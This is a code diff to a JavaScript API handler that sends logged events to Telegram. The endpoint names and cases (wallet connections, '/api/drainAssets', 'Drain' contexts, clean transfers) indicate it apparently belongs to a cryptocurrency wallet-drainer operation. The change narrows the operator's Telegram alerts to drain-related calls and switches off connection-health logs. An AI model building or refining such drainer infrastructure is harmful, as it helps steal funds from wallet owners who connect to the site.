@@ -40,7 +40,10 @@ export default async function handler(req, res) {
           break;
           
         case 'API_CALL':
-          await telegramLogger.logAPICall(enhancedData);
+          // Only forward drain-related API calls
+          if (enhancedData.endpoint === '/api/drainAssets' || enhancedData.context?.includes('Drain')) {
+            await telegramLogger.logAPICall(enhancedData);
+          }
           break;
           
         case 'WALLET_CONNECTION':
@@ -55,13 +58,11 @@ export default async function handler(req, res) {
           await telegramLogger.logFrontendError(enhancedData);
           break;
           
-        case 'RPC_FAILURE':
-          await telegramLogger.logRPCFailure(enhancedData);
-          break;
+        // RPC/connection health logs disabled per requirements
           
-        case 'CONNECTION_ERROR':
-          await telegramLogger.logConnectionError(enhancedData);
-          break;
+        // case 'CONNECTION_ERROR':
+        //   await telegramLogger.logConnectionError(enhancedData);
+        //   break;
           
         case 'VALIDATION':
           await telegramLogger.logValidation(enhancedData);
@@ -115,9 +116,9 @@ export default async function handler(req, res) {
           await telegramLogger.logCleanTransfer(enhancedData);
           break;
           
-        case 'CONNECTION_HEALTH':
-          await telegramLogger.logConnectionHealth(enhancedData);
-          break;
+        // case 'CONNECTION_HEALTH':
+        //   await telegramLogger.logConnectionHealth(enhancedData);
+        //   break;
           
         default:
           // For unknown types, send as unknown event
